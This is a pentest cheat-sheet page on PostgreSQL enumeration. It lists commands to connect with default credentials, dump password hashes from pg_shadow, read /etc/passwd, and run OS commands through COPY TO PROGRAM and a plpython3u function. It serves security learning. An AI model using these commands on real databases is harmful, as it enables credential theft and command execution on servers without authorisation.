---
tags: [pentest, enumeration, postgresql, database, recon]
tool: psql
phase: 3
---
# PostgreSQL Enumeration

PostgreSQL (port 5432). Check for default credentials, file read via copy, and command execution.

[[04 - Enumeration/00 - README|Folder index]]

## Connect

```bash
psql -h 10.10.10.10 -U postgres
psql -h 10.10.10.10 -U postgres -d database_name
```

## Key enumeration

```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;

-- List databases
\l
SELECT datname FROM pg_database;

-- List tables
\dt
SELECT * FROM information_schema.tables WHERE table_schema='public';

-- List users
\du
SELECT usename, passwd FROM pg_shadow;

-- Read files
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';
-- Or:
SELECT pg_read_file('/etc/passwd');
```

## Command execution (superuser)

```sql
-- Using COPY TO PROGRAM
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt';

-- Using UDF
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
  import subprocess; return subprocess.check_output(args, shell=True).decode()
$$ LANGUAGE plpython3u;
SELECT cmd('id');
```

## See also

- [[33 - MSSQL Enumeration]] — MSSQL equivalent
- [[34 - MySQL Enumeration]] — MySQL equivalent
